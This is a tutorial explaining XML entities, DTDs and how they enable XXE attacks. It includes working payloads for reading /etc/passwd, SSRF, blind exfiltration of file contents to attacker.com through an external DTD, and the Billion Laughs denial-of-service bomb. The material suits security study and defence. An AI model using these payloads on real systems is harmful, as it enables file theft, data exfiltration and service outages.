# XML entities (understanding the mechanics behind XXE)

XML entities are a core feature of the XML specification that allow you to define reusable data references within XML documents. While entities serve legitimate purposes (special character encoding, content reuse), they also enable XXE vulnerabilities when parsers process untrusted input with external entity resolution enabled.

Understanding entities, DTDs, and how parsers handle them is essential for both exploiting and preventing XXE.

## What XML is (quick primer)

XML (eXtensible Markup Language) is a markup format for structured data that uses custom tag names (unlike HTML's predefined tags).

Basic XML structure:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="security">
    <title>Web Application Security</title>
    <author>Anonymous</author>
    <price>29.99</price>
  </book>
</bookstore>
```

Key characteristics:
- Hierarchical tree structure (parent/child elements)
- Must be well-formed (properly nested, closed tags)
- Case-sensitive
- Supports attributes: `<book id="123">`
- Can include processing instructions, comments, and DTDs

## Built-in XML entities (predefined)

XML reserves certain characters as syntax markers, so they must be encoded as entities when used as data.

Five predefined entities:
```xml
&lt;    <!-- < (less than) -->
&gt;    <!-- > (greater than) -->
&amp;   <!-- & (ampersand) -->
&apos;  <!-- ' (apostrophe) -->
&quot;  <!-- " (quotation mark) -->
```

Example usage:
```xml
<message>Usage: if (x &lt; 5 &amp;&amp; y &gt; 10) { ... }</message>
```

Displays as: `if (x < 5 && y > 10) { ... }`

## Document Type Definition (DTD)

The DTD defines the structure, legal elements, and entities for an XML document. It can be:
- **Internal**: defined within the XML document
- **External**: loaded from a separate file
- **Hybrid**: combination of both

### Internal DTD syntax:
```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>
  <to>User</to>
  <from>Admin</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting</body>
</note>
```

### External DTD syntax:
```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
  <to>User</to>
  <from>Admin</from>
</note>
```

Where `note.dtd` contains:
```dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

## Custom (general) entities

You can define your own entities in the DTD for content reuse.

Syntax:
```xml
<!ENTITY entityName "replacement value">
```

Example:
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY company "Acme Corp">
  <!ENTITY email "contact@acme.com">
]>
<message>
  <text>Welcome to &company;! Contact us at &email;</text>
</message>
```

Result:
```xml
<message>
  <text>Welcome to Acme Corp! Contact us at contact@acme.com</text>
</message>
```

The parser replaces `&company;` with "Acme Corp" and `&email;` with "contact@acme.com".

## External entities (the XXE attack vector)

External entities use the `SYSTEM` keyword to load content from outside the DTD.

Basic syntax:
```xml
<!ENTITY entityName SYSTEM "URI">
```

### File protocol (local file access):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

When the parser encounters `&xxe;`, it reads `/etc/passwd` and includes the content.

### HTTP protocol (remote URL):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.example.com/api/data">
]>
<data>&xxe;</data>
```

The parser makes an HTTP request to the URL and includes the response.

### Multiple protocol support:
Parsers may support various protocols depending on configuration:
```xml
<!ENTITY xxe SYSTEM "file:///path/to/file">
<!ENTITY xxe SYSTEM "http://url">
<!ENTITY xxe SYSTEM "https://url">
<!ENTITY xxe SYSTEM "ftp://url">
<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,data">
```

## Parameter entities (DTD-only entities)

Parameter entities are used within DTDs (not in the XML document body). They're defined and referenced with `%` instead of `&`.

Syntax:
```xml
<!ENTITY % entityName "value">
```

Reference:
```xml
%entityName;
```

Example (DTD building blocks):
```xml
<!DOCTYPE foo [
  <!ENTITY % base "http://example.com">
  <!ENTITY % path "/api/data">
  <!ENTITY xxe SYSTEM "%base;%path;">
]>
```

### Why parameter entities matter for XXE:

They enable chained external DTD loading and data exfiltration.

Classic blind XXE exfiltration pattern:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>test</data>
```

Contents of `evil.dtd` on attacker server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

Execution flow:
1. Main XML loads external DTD from attacker.com
2. `%file` reads `/etc/passwd`
3. `%eval` defines `%exfil` with file content embedded in URL
4. `%exfil` executes, sending file to attacker's server

Note the `&#x25;` (HTML entity for `%`) — this is needed because you can't nest `%` directly in parameter entity definitions.

## Entity expansion and recursion

Entities can reference other entities, leading to expansion.

Simple expansion:
```xml
<!DOCTYPE foo [
  <!ENTITY a "value A">
  <!ENTITY b "&a; and value B">
]>
<data>&b;</data>
```

Result: `value A and value B`

### Recursive expansion (XML bomb / Billion Laughs attack):
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>
```

Each level multiplies by 10, exponentially expanding memory usage. Level 9 can expand to billions of characters, causing denial of service.

## Character entities and encoding

Numeric character references (not technically entities, but related):
```xml
&#60;   <!-- decimal for < -->
&#x3C;  <!-- hexadecimal for < -->
```

Useful in XXE payloads to avoid breaking XML syntax:
```xml
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

`&#x25;` encodes `%` so the DTD parser doesn't interpret it prematurely.

## Putting it together (anatomy of an XXE payload)

Annotated XXE file disclosure payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- XML declaration (optional but common) -->

<!DOCTYPE foo [
<!-- DOCTYPE declares the document type and opens DTD -->

  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!-- Define external entity "xxe" that loads /etc/passwd -->
  
]>
<!-- Close DTD -->

<stockCheck>
  <productId>&xxe;</productId>
  <!-- Reference the entity - parser replaces this with file content -->
</stockCheck>
```

Parser behavior:
1. Reads XML declaration
2. Processes DOCTYPE and DTD
3. Encounters `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
4. Registers entity `xxe` with source `file:///etc/passwd`
5. Parses document body
6. Encounters `&xxe;`
7. Resolves entity by reading `/etc/passwd`
8. Substitutes file content into `<productId>` element
9. Returns document with expanded content

## Practical implications (why this matters)

The combination of these features creates the XXE attack surface:

**External entities + file protocol** = Arbitrary file read
**External entities + http protocol** = SSRF
**Parameter entities + external DTD** = Blind data exfiltration
**Recursive entities** = DoS
**Entity resolution in user input** = Attack vector

The vulnerability exists because:
- XML parsers enable these features by default
- Developers often don't know entities can load external resources
- Applications accept and parse user-controlled XML without restrictions
- DTD processing happens automatically before application validation

## Testing entity behavior (quick experiments)

Test if entity expansion works:
```xml
<!DOCTYPE test [ <!ENTITY test "ENTITY_WORKED"> ]>
<data>&test;</data>
```

If you see "ENTITY_WORKED" in output, entities are processed.

Test if external entities work:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://example.com"> ]>
<data>&xxe;</data>
```

If you see content from example.com, external entities are enabled (XXE vulnerability confirmed).

Test if parameter entities work:
```xml
<!DOCTYPE test [ 
  <!ENTITY % param "<!ENTITY xxe 'PARAM_WORKED'>">
  %param;
]>
<data>&xxe;</data>
```
